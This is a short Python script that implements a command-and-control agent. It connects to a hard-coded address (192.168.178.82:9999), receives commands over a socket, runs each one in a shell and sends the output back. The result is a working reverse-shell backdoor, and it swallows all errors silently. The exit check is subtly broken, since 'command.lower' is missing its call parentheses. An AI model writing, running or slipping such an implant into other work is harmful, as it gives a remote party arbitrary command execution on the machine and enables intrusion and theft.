import socket
import subprocess


class Agent:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port

    def connect_to_c2(self):
        s = socket.socket()

        try:
            s.connect((self.server_host, self.server_port))
            while True:
                command = s.recv(1024).decode()
                if command.lower in ["exit", "quit"]:
                    break

                output = subprocess.getoutput(command)
                if output == "" or output == " ":
                    output = "[+] Command executed (no output)"
                s.send(output.encode())
        except Exception:
            pass
        finally:
            s.close()


if __name__ == "__main__":
    server_host = "192.168.178.82"
    server_port = 9999
    agent = Agent(server_host, server_port)
    agent.connect_to_c2()
